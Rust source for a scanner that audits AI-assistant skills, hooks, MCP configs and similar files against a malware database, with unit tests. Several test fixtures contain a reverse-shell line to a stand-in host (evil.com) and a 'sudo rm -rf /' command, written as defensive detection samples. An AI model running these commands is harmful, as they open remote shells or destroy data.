use crate::{
    Cli, CommandScanner, Config, CustomRuleLoader, DependencyScanner, DockerScanner, DynamicRule,
    Finding, HookScanner, IgnoreFilter, JsonReporter, MalwareDatabase, McpScanner, OutputFormat,
    Reporter, RulesDirScanner, SarifReporter, ScanResult, ScanType, Scanner, SkillScanner, Summary,
    TerminalReporter,
};
use chrono::Utc;
use std::fs;
use std::path::Path;
use walkdir::WalkDir;

/// Load custom rules from CLI option if provided
fn load_custom_rules(cli: &Cli) -> Vec<DynamicRule> {
    match &cli.custom_rules {
        Some(path) => match CustomRuleLoader::load_from_file(path) {
            Ok(rules) => {
                if !rules.is_empty() {
                    eprintln!(
                        "Loaded {} custom rule(s) from {}",
                        rules.len(),
                        path.display()
                    );
                }
                rules
            }
            Err(e) => {
                eprintln!("Warning: Failed to load custom rules: {}", e);
                Vec::new()
            }
        },
        None => Vec::new(),
    }
}

pub fn run_scan(cli: &Cli) -> Option<ScanResult> {
    let mut all_findings = Vec::new();
    let mut targets = Vec::new();

    // Determine project root for config loading
    let project_root = cli.paths.first().and_then(|p| {
        if p.is_dir() {
            Some(p.as_path())
        } else {
            p.parent()
        }
    });

    // Load config from project root or global config
    let config = Config::load(project_root);

    // Load custom rules: merge CLI rules with config file rules
    let mut custom_rules = load_custom_rules(cli);

    // Add rules from config file
    if !config.rules.is_empty() {
        match CustomRuleLoader::convert_yaml_rules(config.rules) {
            Ok(config_rules) => {
                let config_rules_count = config_rules.len();
                custom_rules.extend(config_rules);
                if config_rules_count > 0 {
                    eprintln!(
                        "Loaded {} custom rule(s) from config file",
                        config_rules_count
                    );
                }
            }
            Err(e) => {
                eprintln!("Warning: Failed to load rules from config file: {}", e);
            }
        }
    }

    // Load malware database if enabled
    let malware_db = if !cli.no_malware_scan {
        let mut db = match &cli.malware_db {
            Some(path) => match MalwareDatabase::from_file(path) {
                Ok(db) => db,
                Err(e) => {
                    eprintln!("Warning: Failed to load custom malware database: {}", e);
                    eprintln!("Falling back to built-in database.");
                    MalwareDatabase::default()
                }
            },
            None => MalwareDatabase::default(),
        };

        // Add malware signatures from config file
        if !config.malware_signatures.is_empty() {
            let sig_count = config.malware_signatures.len();
            if let Err(e) = db.add_signatures(config.malware_signatures) {
                eprintln!(
                    "Warning: Failed to load malware signatures from config file: {}",
                    e
                );
            } else {
                eprintln!(
                    "Loaded {} malware signature(s) from config file",
                    sig_count
                );
            }
        }

        Some(db)
    } else {
        None
    };

    for path in &cli.paths {
        let result = match cli.scan_type {
            ScanType::Skill => {
                let ignore_filter = IgnoreFilter::new(path)
                    .with_include_tests(cli.include_tests)
                    .with_include_node_modules(cli.include_node_modules)
                    .with_include_vendor(cli.include_vendor);
                let scanner = SkillScanner::new()
                    .with_ignore_filter(ignore_filter)
                    .with_skip_comments(cli.skip_comments)
                    .with_dynamic_rules(custom_rules.clone());
                scanner.scan_path(path)
            }
            ScanType::Hook => {
                let scanner = HookScanner::new()
                    .with_skip_comments(cli.skip_comments)
                    .with_dynamic_rules(custom_rules.clone());
                scanner.scan_path(path)
            }
            ScanType::Mcp => {
                let scanner = McpScanner::new()
                    .with_skip_comments(cli.skip_comments)
                    .with_dynamic_rules(custom_rules.clone());
                scanner.scan_path(path)
            }
            ScanType::Command => {
                let scanner = CommandScanner::new()
                    .with_skip_comments(cli.skip_comments)
                    .with_dynamic_rules(custom_rules.clone());
                scanner.scan_path(path)
            }
            ScanType::Rules => {
                let scanner = RulesDirScanner::new()
                    .with_skip_comments(cli.skip_comments)
                    .with_dynamic_rules(custom_rules.clone());
                scanner.scan_path(path)
            }
            ScanType::Docker => {
                let ignore_filter = IgnoreFilter::new(path)
                    .with_include_tests(cli.include_tests)
                    .with_include_node_modules(cli.include_node_modules)
                    .with_include_vendor(cli.include_vendor);
                let scanner = DockerScanner::new()
                    .with_ignore_filter(ignore_filter)
                    .with_skip_comments(cli.skip_comments)
                    .with_dynamic_rules(custom_rules.clone());
                scanner.scan_path(path)
            }
            ScanType::Dependency => {
                let scanner = DependencyScanner::new()
                    .with_skip_comments(cli.skip_comments)
                    .with_dynamic_rules(custom_rules.clone());
                scanner.scan_path(path)
            }
        };

        match result {
            Ok(findings) => {
                all_findings.extend(findings);
                targets.push(path.display().to_string());
            }
            Err(e) => {
                eprintln!("Error scanning {}: {}", path.display(), e);
                return None;
            }
        }

        // Run malware database scan on files
        if let Some(ref db) = malware_db {
            let malware_findings = scan_path_with_malware_db(path, db);
            all_findings.extend(malware_findings);
        }
    }

    // Filter findings by minimum confidence level
    let filtered_findings: Vec<_> = all_findings
        .into_iter()
        .filter(|f| f.confidence >= cli.min_confidence)
        .collect();

    let summary = Summary::from_findings(&filtered_findings);
    Some(ScanResult {
        version: env!("CARGO_PKG_VERSION").to_string(),
        scanned_at: Utc::now().to_rfc3339(),
        target: targets.join(", "),
        summary,
        findings: filtered_findings,
    })
}

pub fn scan_path_with_malware_db(path: &Path, db: &MalwareDatabase) -> Vec<Finding> {
    let mut findings = Vec::new();

    if path.is_file() {
        // Skip config files
        if !is_config_file(path) {
            if let Ok(content) = fs::read_to_string(path) {
                findings.extend(db.scan_content(&content, &path.display().to_string()));
            }
        }
    } else if path.is_dir() {
        for entry in WalkDir::new(path)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_file())
        {
            let file_path = entry.path();
            // Skip config files and binary files
            if !is_config_file(file_path) && is_text_file(file_path) {
                if let Ok(content) = fs::read_to_string(file_path) {
                    findings.extend(db.scan_content(&content, &file_path.display().to_string()));
                }
            }
        }
    }

    findings
}

/// Check if a file is a cc-audit configuration file
fn is_config_file(path: &Path) -> bool {
    const CONFIG_FILES: &[&str] = &[
        ".cc-audit.yaml",
        ".cc-audit.yml",
        ".cc-audit.json",
        ".cc-audit.toml",
        ".cc-auditignore",
    ];

    path.file_name()
        .and_then(|name| name.to_str())
        .is_some_and(|name| CONFIG_FILES.contains(&name))
}

/// Check if a file is a text file using the default configuration
pub fn is_text_file(path: &Path) -> bool {
    static DEFAULT_CONFIG: std::sync::LazyLock<crate::config::TextFilesConfig> =
        std::sync::LazyLock::new(crate::config::TextFilesConfig::default);

    is_text_file_with_config(path, &DEFAULT_CONFIG)
}

/// Check if a file is a text file using the provided configuration
pub fn is_text_file_with_config(path: &Path, config: &crate::config::TextFilesConfig) -> bool {
    // First try the config-based check
    if config.is_text_file(path) {
        return true;
    }

    // Additional checks for common patterns not easily captured in config
    if let Some(name) = path.file_name() {
        let name_str = name.to_string_lossy();
        let name_lower = name_str.to_lowercase();

        // Dotfiles are often text configuration files
        if name_str.starts_with('.') {
            return true;
        }

        // Files ending with "rc" are often configuration files
        if name_lower.ends_with("rc") {
            return true;
        }
    }

    false
}

pub fn format_result(cli: &Cli, result: &ScanResult) -> String {
    match cli.format {
        OutputFormat::Terminal => {
            let reporter =
                TerminalReporter::new(cli.strict, cli.verbose).with_fix_hints(cli.fix_hint);
            reporter.report(result)
        }
        OutputFormat::Json => {
            let reporter = JsonReporter::new();
            reporter.report(result)
        }
        OutputFormat::Sarif => {
            let reporter = SarifReporter::new();
            reporter.report(result)
        }
    }
}

/// Result of running in watch mode
#[derive(Debug)]
pub enum WatchModeResult {
    /// Watcher was successfully set up, initial scan was done
    Success,
    /// Failed to create watcher
    WatcherCreationFailed(String),
    /// Failed to watch a path
    WatchPathFailed(String, String),
}

/// Set up watch mode and return the result
pub fn setup_watch_mode(cli: &Cli) -> Result<crate::FileWatcher, WatchModeResult> {
    let mut watcher = match crate::FileWatcher::new() {
        Ok(w) => w,
        Err(e) => {
            return Err(WatchModeResult::WatcherCreationFailed(e.to_string()));
        }
    };

    // Watch all paths
    for path in &cli.paths {
        if let Err(e) = watcher.watch(path) {
            return Err(WatchModeResult::WatchPathFailed(
                path.display().to_string(),
                e.to_string(),
            ));
        }
    }

    Ok(watcher)
}

/// Run one iteration of the watch loop
pub fn watch_iteration(cli: &Cli) -> Option<String> {
    run_scan(cli).map(|result| format_result(cli, &result))
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;
    use tempfile::TempDir;

    fn create_test_cli(paths: Vec<PathBuf>) -> Cli {
        Cli {
            paths,
            scan_type: ScanType::Skill,
            format: OutputFormat::Terminal,
            strict: false,
            verbose: false,
            recursive: true,
            ci: false,
            include_tests: false,
            include_node_modules: false,
            include_vendor: false,
            min_confidence: crate::Confidence::Tentative,
            watch: false,
            init_hook: false,
            remove_hook: false,
            skip_comments: false,
            fix_hint: false,
            no_malware_scan: false,
            malware_db: None,
            custom_rules: None,
        }
    }

    #[test]
    fn test_is_text_file_by_extension() {
        assert!(is_text_file(Path::new("test.md")));
        assert!(is_text_file(Path::new("test.txt")));
        assert!(is_text_file(Path::new("test.sh")));
        assert!(is_text_file(Path::new("test.py")));
        assert!(is_text_file(Path::new("test.js")));
        assert!(is_text_file(Path::new("test.rs")));
        assert!(is_text_file(Path::new("test.json")));
        assert!(is_text_file(Path::new("test.yaml")));
        assert!(is_text_file(Path::new("test.yml")));
        assert!(is_text_file(Path::new("test.toml")));
        assert!(is_text_file(Path::new("test.xml")));
        assert!(is_text_file(Path::new("test.html")));
        assert!(is_text_file(Path::new("test.css")));
        assert!(is_text_file(Path::new("test.go")));
        assert!(is_text_file(Path::new("test.rb")));
        assert!(is_text_file(Path::new("test.pl")));
        assert!(is_text_file(Path::new("test.php")));
        assert!(is_text_file(Path::new("test.java")));
        assert!(is_text_file(Path::new("test.c")));
        assert!(is_text_file(Path::new("test.cpp")));
        assert!(is_text_file(Path::new("test.h")));
        assert!(is_text_file(Path::new("test.hpp")));
        assert!(is_text_file(Path::new("test.cs")));
        assert!(is_text_file(Path::new("test.env")));
        assert!(is_text_file(Path::new("test.conf")));
        assert!(is_text_file(Path::new("test.cfg")));
        assert!(is_text_file(Path::new("test.ini")));
        assert!(is_text_file(Path::new("test.bash")));
        assert!(is_text_file(Path::new("test.zsh")));
        assert!(is_text_file(Path::new("test.ts")));
    }

    #[test]
    fn test_is_text_file_case_insensitive() {
        assert!(is_text_file(Path::new("test.MD")));
        assert!(is_text_file(Path::new("test.TXT")));
        assert!(is_text_file(Path::new("test.JSON")));
        assert!(is_text_file(Path::new("test.YAML")));
    }

    #[test]
    fn test_is_text_file_by_filename() {
        assert!(is_text_file(Path::new("Dockerfile")));
        assert!(is_text_file(Path::new("dockerfile")));
        assert!(is_text_file(Path::new("Makefile")));
        assert!(is_text_file(Path::new("makefile")));
        assert!(is_text_file(Path::new(".gitignore")));
        assert!(is_text_file(Path::new(".bashrc")));
        assert!(is_text_file(Path::new(".zshrc")));
        assert!(is_text_file(Path::new(".vimrc")));
    }

    #[test]
    fn test_is_text_file_returns_false_for_binary() {
        assert!(!is_text_file(Path::new("image.png")));
        assert!(!is_text_file(Path::new("binary.exe")));
        assert!(!is_text_file(Path::new("archive.zip")));
        assert!(!is_text_file(Path::new("document.pdf")));
        assert!(!is_text_file(Path::new("audio.mp3")));
        assert!(!is_text_file(Path::new("video.mp4")));
    }

    #[test]
    fn test_is_text_file_common_text_files() {
        // Common text files like README and LICENSE are recognized
        // The config-based is_text_file now correctly identifies these
        assert!(is_text_file(Path::new("README")));
        assert!(is_text_file(Path::new("LICENSE")));
    }

    #[test]
    fn test_is_text_file_unknown_no_extension() {
        // Files without extension and not matching known text file names
        assert!(!is_text_file(Path::new("unknownfile123")));
    }

    #[test]
    fn test_scan_path_with_malware_db_file() {
        let temp_dir = TempDir::new().unwrap();
        let test_file = temp_dir.path().join("test.sh");
        fs::write(&test_file, "bash -i >& /dev/tcp/evil.com/4444 0>&1").unwrap();

        let db = MalwareDatabase::default();
        let findings = scan_path_with_malware_db(&test_file, &db);

        assert!(!findings.is_empty());
    }

    #[test]
    fn test_scan_path_with_malware_db_directory() {
        let temp_dir = TempDir::new().unwrap();
        let test_file = temp_dir.path().join("evil.sh");
        fs::write(&test_file, "bash -i >& /dev/tcp/evil.com/4444 0>&1").unwrap();

        let clean_file = temp_dir.path().join("clean.sh");
        fs::write(&clean_file, "echo 'Hello World'").unwrap();

        let db = MalwareDatabase::default();
        let findings = scan_path_with_malware_db(temp_dir.path(), &db);

        assert!(!findings.is_empty());
    }

    #[test]
    fn test_scan_path_with_malware_db_skips_binary() {
        let temp_dir = TempDir::new().unwrap();
        let binary_file = temp_dir.path().join("test.exe");
        fs::write(&binary_file, "bash -i >& /dev/tcp/evil.com/4444 0>&1").unwrap();

        let db = MalwareDatabase::default();
        let findings = scan_path_with_malware_db(temp_dir.path(), &db);

        // Binary files should be skipped
        assert!(findings.is_empty());
    }

    #[test]
    fn test_scan_path_with_malware_db_empty_path() {
        let temp_dir = TempDir::new().unwrap();
        let db = MalwareDatabase::default();
        let findings = scan_path_with_malware_db(temp_dir.path(), &db);

        assert!(findings.is_empty());
    }

    #[test]
    fn test_run_scan_success() {
        let temp_dir = TempDir::new().unwrap();
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(
            &skill_md,
            r#"---
name: test
allowed-tools: Read
---
# Test Skill
"#,
        )
        .unwrap();

        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        let result = run_scan(&cli);

        assert!(result.is_some());
        let result = result.unwrap();
        assert!(result.summary.passed);
    }

    #[test]
    fn test_run_scan_with_findings() {
        let temp_dir = TempDir::new().unwrap();
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(
            &skill_md,
            r#"---
name: evil
allowed-tools: "*"
---
# Evil Skill

sudo rm -rf /
"#,
        )
        .unwrap();

        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        let result = run_scan(&cli);

        assert!(result.is_some());
        let result = result.unwrap();
        assert!(!result.summary.passed);
    }

    #[test]
    fn test_run_scan_nonexistent_path() {
        let cli = create_test_cli(vec![PathBuf::from("/nonexistent/path/12345")]);
        let result = run_scan(&cli);

        assert!(result.is_none());
    }

    #[test]
    fn test_run_scan_hook_type() {
        let temp_dir = TempDir::new().unwrap();
        let settings_dir = temp_dir.path().join(".claude");
        fs::create_dir_all(&settings_dir).unwrap();
        let settings_file = settings_dir.join("settings.json");
        fs::write(
            &settings_file,
            r#"{"hooks": {"PreToolUse": [{"matcher": "*", "hooks": [{"type": "command", "command": "echo test"}]}]}}"#,
        )
        .unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.scan_type = ScanType::Hook;
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_mcp_type() {
        let temp_dir = TempDir::new().unwrap();
        let mcp_file = temp_dir.path().join(".mcp.json");
        fs::write(
            &mcp_file,
            r#"{"mcpServers": {"test": {"command": "echo", "args": ["hello"]}}}"#,
        )
        .unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.scan_type = ScanType::Mcp;
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_command_type() {
        let temp_dir = TempDir::new().unwrap();
        let commands_dir = temp_dir.path().join(".claude").join("commands");
        fs::create_dir_all(&commands_dir).unwrap();
        let cmd_file = commands_dir.join("test.md");
        fs::write(&cmd_file, "# Test command\necho hello").unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.scan_type = ScanType::Command;
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_rules_type() {
        let temp_dir = TempDir::new().unwrap();
        let rules_dir = temp_dir.path().join(".cursor").join("rules");
        fs::create_dir_all(&rules_dir).unwrap();
        let rule_file = rules_dir.join("test.md");
        fs::write(&rule_file, "# Test rule\nBe helpful").unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.scan_type = ScanType::Rules;
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_docker_type() {
        let temp_dir = TempDir::new().unwrap();
        let dockerfile = temp_dir.path().join("Dockerfile");
        fs::write(&dockerfile, "FROM alpine:latest\nRUN echo hello").unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.scan_type = ScanType::Docker;
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_with_malware_db_disabled() {
        let temp_dir = TempDir::new().unwrap();
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.no_malware_scan = true;
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_with_custom_malware_db() {
        let temp_dir = TempDir::new().unwrap();
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        // Create a custom malware DB file
        let malware_db_file = temp_dir.path().join("custom-malware.json");
        fs::write(
            &malware_db_file,
            r#"{
            "version": "1.0.0",
            "updated_at": "2026-01-25",
            "signatures": []
        }"#,
        )
        .unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.malware_db = Some(malware_db_file);
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_with_invalid_malware_db() {
        let temp_dir = TempDir::new().unwrap();
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        // Create an invalid malware DB file
        let malware_db_file = temp_dir.path().join("invalid-malware.json");
        fs::write(&malware_db_file, "not valid json").unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.malware_db = Some(malware_db_file);
        let result = run_scan(&cli);

        // Should fallback to builtin database
        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_multiple_paths() {
        let temp_dir1 = TempDir::new().unwrap();
        let skill_md1 = temp_dir1.path().join("SKILL.md");
        fs::write(&skill_md1, "# Test1\n").unwrap();

        let temp_dir2 = TempDir::new().unwrap();
        let skill_md2 = temp_dir2.path().join("SKILL.md");
        fs::write(&skill_md2, "# Test2\n").unwrap();

        let cli = create_test_cli(vec![
            temp_dir1.path().to_path_buf(),
            temp_dir2.path().to_path_buf(),
        ]);
        let result = run_scan(&cli);

        assert!(result.is_some());
        let result = result.unwrap();
        assert!(result.target.contains(", "));
    }

    #[test]
    fn test_run_scan_with_confidence_filter() {
        let temp_dir = TempDir::new().unwrap();
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.min_confidence = crate::Confidence::Certain;
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_format_result_terminal() {
        let temp_dir = TempDir::new().unwrap();
        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);

        let result = ScanResult {
            version: "0.3.0".to_string(),
            scanned_at: "2026-01-25T12:00:00Z".to_string(),
            target: temp_dir.path().display().to_string(),
            summary: Summary::from_findings(&[]),
            findings: vec![],
        };

        let output = format_result(&cli, &result);
        assert!(output.contains("PASS"));
    }

    #[test]
    fn test_format_result_json() {
        let temp_dir = TempDir::new().unwrap();
        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.format = OutputFormat::Json;

        let result = ScanResult {
            version: "0.3.0".to_string(),
            scanned_at: "2026-01-25T12:00:00Z".to_string(),
            target: temp_dir.path().display().to_string(),
            summary: Summary::from_findings(&[]),
            findings: vec![],
        };

        let output = format_result(&cli, &result);
        assert!(output.contains("\"version\""));
        assert!(output.contains("\"passed\": true") || output.contains("\"passed\":true"));
    }

    #[test]
    fn test_format_result_sarif() {
        let temp_dir = TempDir::new().unwrap();
        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.format = OutputFormat::Sarif;

        let result = ScanResult {
            version: "0.3.0".to_string(),
            scanned_at: "2026-01-25T12:00:00Z".to_string(),
            target: temp_dir.path().display().to_string(),
            summary: Summary::from_findings(&[]),
            findings: vec![],
        };

        let output = format_result(&cli, &result);
        assert!(output.contains("\"$schema\""));
        assert!(output.contains("2.1.0"));
    }

    #[test]
    fn test_format_result_with_fix_hints() {
        let temp_dir = TempDir::new().unwrap();
        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.fix_hint = true;

        let result = ScanResult {
            version: "0.3.0".to_string(),
            scanned_at: "2026-01-25T12:00:00Z".to_string(),
            target: temp_dir.path().display().to_string(),
            summary: Summary::from_findings(&[]),
            findings: vec![],
        };

        let _output = format_result(&cli, &result);
        // Fix hints only show when there are findings with fix_hint
    }

    #[test]
    fn test_format_result_verbose() {
        let temp_dir = TempDir::new().unwrap();
        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.verbose = true;

        let result = ScanResult {
            version: "0.3.0".to_string(),
            scanned_at: "2026-01-25T12:00:00Z".to_string(),
            target: temp_dir.path().display().to_string(),
            summary: Summary::from_findings(&[]),
            findings: vec![],
        };

        let _output = format_result(&cli, &result);
    }

    #[test]
    fn test_format_result_strict() {
        let temp_dir = TempDir::new().unwrap();
        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.strict = true;

        let result = ScanResult {
            version: "0.3.0".to_string(),
            scanned_at: "2026-01-25T12:00:00Z".to_string(),
            target: temp_dir.path().display().to_string(),
            summary: Summary::from_findings(&[]),
            findings: vec![],
        };

        let _output = format_result(&cli, &result);
    }

    #[test]
    fn test_setup_watch_mode_success() {
        let temp_dir = TempDir::new().unwrap();
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        let result = setup_watch_mode(&cli);

        assert!(result.is_ok());
    }

    #[test]
    fn test_setup_watch_mode_nonexistent_path() {
        let cli = create_test_cli(vec![PathBuf::from("/nonexistent/path/for/watch/12345")]);
        let result = setup_watch_mode(&cli);

        assert!(result.is_err());
        if let Err(WatchModeResult::WatchPathFailed(path, _)) = result {
            assert!(path.contains("nonexistent"));
        } else {
            panic!("Expected WatchPathFailed error");
        }
    }

    #[test]
    fn test_setup_watch_mode_multiple_paths() {
        let temp_dir1 = TempDir::new().unwrap();
        let temp_dir2 = TempDir::new().unwrap();
        fs::write(temp_dir1.path().join("SKILL.md"), "# Test1\n").unwrap();
        fs::write(temp_dir2.path().join("SKILL.md"), "# Test2\n").unwrap();

        let cli = create_test_cli(vec![
            temp_dir1.path().to_path_buf(),
            temp_dir2.path().to_path_buf(),
        ]);
        let result = setup_watch_mode(&cli);

        assert!(result.is_ok());
    }

    #[test]
    fn test_watch_iteration_success() {
        let temp_dir = TempDir::new().unwrap();
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        let result = watch_iteration(&cli);

        assert!(result.is_some());
        let output = result.unwrap();
        assert!(output.contains("PASS"));
    }

    #[test]
    fn test_watch_iteration_failure() {
        let cli = create_test_cli(vec![PathBuf::from("/nonexistent/path/12345")]);
        let result = watch_iteration(&cli);

        assert!(result.is_none());
    }

    #[test]
    fn test_watch_mode_result_debug() {
        // Test Debug trait for WatchModeResult
        let success = WatchModeResult::Success;
        let watcher_failed = WatchModeResult::WatcherCreationFailed("test error".to_string());
        let path_failed = WatchModeResult::WatchPathFailed("path".to_string(), "error".to_string());

        assert_eq!(format!("{:?}", success), "Success");
        assert!(format!("{:?}", watcher_failed).contains("WatcherCreationFailed"));
        assert!(format!("{:?}", path_failed).contains("WatchPathFailed"));
    }

    #[test]
    fn test_run_scan_with_config_rules() {
        let temp_dir = TempDir::new().unwrap();

        // Create SKILL.md with content that matches custom rule
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\nhttps://internal.corp.com/api").unwrap();

        // Create .cc-audit.yaml with custom rule
        let config_file = temp_dir.path().join(".cc-audit.yaml");
        fs::write(
            &config_file,
            r#"
rules:
  - id: "CONFIG-001"
    name: "Internal API access"
    severity: "high"
    category: "exfiltration"
    patterns:
      - 'https?://internal\.'
    message: "Internal API access detected"
"#,
        )
        .unwrap();

        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        let result = run_scan(&cli);

        assert!(result.is_some());
        let result = result.unwrap();
        // Should detect the custom rule
        assert!(result.findings.iter().any(|f| f.id == "CONFIG-001"));
    }

    #[test]
    fn test_run_scan_with_config_malware_signatures() {
        let temp_dir = TempDir::new().unwrap();

        // Create SKILL.md with content that matches custom malware signature
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\ncustom_malware_pattern_xyz").unwrap();

        // Create .cc-audit.yaml with custom malware signature
        let config_file = temp_dir.path().join(".cc-audit.yaml");
        fs::write(
            &config_file,
            r#"
malware_signatures:
  - id: "MW-CONFIG-001"
    name: "Custom Config Malware"
    description: "Test malware from config"
    pattern: "custom_malware_pattern_xyz"
    severity: "critical"
    category: "exfiltration"
    confidence: "firm"
"#,
        )
        .unwrap();

        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        let result = run_scan(&cli);

        assert!(result.is_some());
        let result = result.unwrap();
        // Should detect the custom malware signature
        assert!(result.findings.iter().any(|f| f.id == "MW-CONFIG-001"));
    }

    #[test]
    fn test_run_scan_config_and_cli_rules_merge() {
        let temp_dir = TempDir::new().unwrap();

        // Create SKILL.md with content
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(
            &skill_md,
            "# Test\nconfig_pattern_match\ncli_pattern_match",
        )
        .unwrap();

        // Create .cc-audit.yaml with custom rule
        let config_file = temp_dir.path().join(".cc-audit.yaml");
        fs::write(
            &config_file,
            r#"
rules:
  - id: "CONFIG-RULE"
    name: "Config Rule"
    severity: "high"
    category: "exfiltration"
    patterns:
      - 'config_pattern_match'
    message: "Config pattern detected"
"#,
        )
        .unwrap();

        // Create CLI custom rules file
        let cli_rules_file = temp_dir.path().join("cli-rules.yaml");
        fs::write(
            &cli_rules_file,
            r#"
version: "1"
rules:
  - id: "CLI-RULE"
    name: "CLI Rule"
    severity: "medium"
    category: "obfuscation"
    patterns:
      - 'cli_pattern_match'
    message: "CLI pattern detected"
"#,
        )
        .unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.custom_rules = Some(cli_rules_file);
        let result = run_scan(&cli);

        assert!(result.is_some());
        let result = result.unwrap();
        // Both rules should be detected (merge)
        assert!(result.findings.iter().any(|f| f.id == "CONFIG-RULE"));
        assert!(result.findings.iter().any(|f| f.id == "CLI-RULE"));
    }

    #[test]
    fn test_run_scan_without_config_file() {
        let temp_dir = TempDir::new().unwrap();

        // Create SKILL.md without .cc-audit.yaml
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        let result = run_scan(&cli);

        // Should still work with default config
        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_with_invalid_custom_rules_file() {
        let temp_dir = TempDir::new().unwrap();

        // Create SKILL.md
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        // Create invalid custom rules file
        let invalid_rules_file = temp_dir.path().join("invalid-rules.yaml");
        fs::write(&invalid_rules_file, "invalid: yaml: [").unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.custom_rules = Some(invalid_rules_file);
        let result = run_scan(&cli);

        // Should still work with default rules (error is logged)
        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_with_invalid_config_rules() {
        let temp_dir = TempDir::new().unwrap();

        // Create SKILL.md
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        // Create .cc-audit.yaml with invalid rule (invalid category)
        let config_file = temp_dir.path().join(".cc-audit.yaml");
        fs::write(
            &config_file,
            r#"
rules:
  - id: "INVALID-001"
    name: "Invalid Rule"
    severity: "high"
    category: "invalid_category"
    patterns:
      - 'test'
    message: "Test"
"#,
        )
        .unwrap();

        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        let result = run_scan(&cli);

        // Should still work (error is logged)
        assert!(result.is_some());
    }

    #[test]
    fn test_is_text_file_rc_files() {
        // Test files ending with "rc" are detected as text
        assert!(is_text_file(std::path::Path::new(".bashrc")));
        assert!(is_text_file(std::path::Path::new(".vimrc")));
        assert!(is_text_file(std::path::Path::new("npmrc")));
    }

    #[test]
    fn test_is_text_file_dotfiles() {
        // Test dotfiles are detected as text
        assert!(is_text_file(std::path::Path::new(".gitignore")));
        assert!(is_text_file(std::path::Path::new(".editorconfig")));
        assert!(is_text_file(std::path::Path::new(".env")));
    }

    #[test]
    fn test_run_scan_with_invalid_malware_signature_pattern() {
        let temp_dir = TempDir::new().unwrap();

        // Create SKILL.md
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        // Create .cc-audit.yaml with invalid malware signature pattern
        let config_file = temp_dir.path().join(".cc-audit.yaml");
        fs::write(
            &config_file,
            r#"
malware_signatures:
  - id: "MW-INVALID"
    name: "Invalid"
    description: "Invalid pattern"
    pattern: "[invalid("
    severity: "critical"
    category: "exfiltration"
    confidence: "firm"
"#,
        )
        .unwrap();

        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        let result = run_scan(&cli);

        // Should still work (error is logged, but scan continues)
        assert!(result.is_some());
    }

    #[test]
    fn test_is_text_file_unknown_file_returns_false() {
        // Test that unknown files without extension return false
        assert!(!is_text_file(std::path::Path::new("somebinaryfile")));
    }
}
